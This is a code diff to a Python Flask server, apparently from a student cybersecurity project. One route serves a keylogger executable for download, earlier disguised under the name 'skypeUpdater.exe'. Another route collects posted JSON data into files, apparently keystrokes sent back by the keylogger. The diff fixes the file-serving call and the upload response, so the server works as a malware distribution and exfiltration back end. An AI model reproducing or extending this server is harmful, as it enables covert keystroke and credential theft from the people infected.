@@ -1,6 +1,6 @@
 import json
 import os
-from flask import request
+from flask import request, send_file
 from datetime import datetime
 import ssl
 from flask import Flask
@@ -25,10 +25,10 @@ if not os.path.exists(folder):
     
 @app.route('/getVir')
 def getCandys():
-    file_path = ''
-    filename = 'skypeUpdater.exe'
+    file_path = r'C:\Users\picco\OneDrive\Desktop\università\magistrale\cybersec\keyloggerc\keylogger\keylogger\bin\Debug\net8.0-windows7.0\keylogger.exe'
+    filename = 'keylogger.exe'
 
-    return os.sendfile(file_path, as_attachment=True, download_name=filename)
+    return send_file(file_path, as_attachment=True, download_name=filename)
 
 @app.route('/sendUpdates', methods=['POST'])
 def upload():
@@ -47,11 +47,7 @@ def upload():
                 with open(file_path, 'w') as f:
                     json.dump(data, f)
        
-                return None
-            
-            # non ho dati
-            else:
-                return None
+            return "200"
     except Exception as e:
         pass
 
